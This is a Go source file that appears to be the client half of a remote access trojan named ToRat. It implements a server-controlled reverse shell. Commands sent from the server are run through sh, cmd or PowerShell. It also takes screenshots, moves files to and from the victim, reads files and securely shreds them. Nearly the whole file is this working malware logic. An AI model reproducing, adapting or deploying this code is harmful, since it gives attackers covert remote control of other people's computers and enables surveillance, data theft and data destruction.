package client

import (
	"log"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strings"

	"github.com/lu4p/ToRat_client/cat"
	"github.com/lu4p/ToRat_client/crypto"
	"github.com/lu4p/ToRat_client/screen"
	"github.com/lu4p/ToRat_client/shred"
)

func ls(path string) string {
	files, err := filepath.Glob("*")
	if err != nil {
		files[0] = "failed"
	}
	return strings.Join(files, "/")
}

// shell is the reverse shell which is controlled by the server
func (c *connection) shell() {
	for {
		cmdbyte, err := c.recv()
		if err != nil {
			return
		}
		cmd := string(cmdbyte)
		log.Println("New cmd:", cmd)
		cmdsp := strings.SplitN(cmd, " ", 2)
		var output []byte
		out := true

		switch cmdsp[0] {
		case "hostname":
			output = crypto.GetHostname(HostnamePath)
		case "down":
			out = false
			c.sendFile(cmdsp[1])
		case "up":
			out = false
			c.recvFile(cmdsp[1])
		case "cd":
			fname := strings.Split(cmd, " ")[1]
			log.Println("[" + fname + "]")
			err := os.Chdir(fname)
			if err != nil {
				output = []byte("Could not Change Directory")
			} else {
				cwd, err := os.Getwd()
				if err != nil {
					output = []byte("Unkown")
				} else {
					output = []byte(cwd)
				}
			}
		case "screen":
			output = screen.Take()

		case "ping":
			output = []byte("pong")
		case "cat":
			log.Println(cmdsp)
			output = []byte(cat.Cat(cmdsp[1]))

		case "reconnect":
			break
		case "sync":
			c.sync()
		case "askpass":

		case "info":

		case "escape":
			runCmd(cmdsp[1], false)
		case "clearlog":

		case "cwd":
			path, err := os.Getwd()
			if err != nil {
				output = []byte("Unknown")
			} else {
				output = []byte(path)
			}

		case "ls":
			files, err := filepath.Glob("*")
			if err != nil {
				return
			}
			output = []byte(strings.Join(files, " "))

		case "shred":
			shred.Path(cmdsp[1], true)
			output = []byte("Shredded and deleted file")

		default:
			output = runCmd(cmd, false)
		}
		if output == nil && out {
			c.sendSt("No output something potentially went wrong!")
		} else {
			c.send(output)
		}
	}
}

// TODO: add sync for the logs
func (c *connection) sync() {

}

func runCmd(cmd string, powershell bool) []byte {
	var osshell string
	if cmd == "" {
		return []byte("Error: No command to execute!")
	}
	var osshellargs []string
	if runtime.GOOS == "linux" {
		osshell = "/bin/sh"
		osshellargs = []string{"-c", cmd}

	} else if runtime.GOOS == "windows" {
		if powershell {
			osshell = "powershell"
			osshellargs = []string{"-Command", cmd}

		} else {
			osshell = "cmd"
			osshellargs = []string{"/C", cmd}
		}
	}
	execcmd := exec.Command(osshell, osshellargs...)
	cmdout, err := execcmd.Output()
	if err != nil {
		return []byte("err")
	} else if cmdout == nil {
		return []byte("no output!")
	}
	return cmdout

}
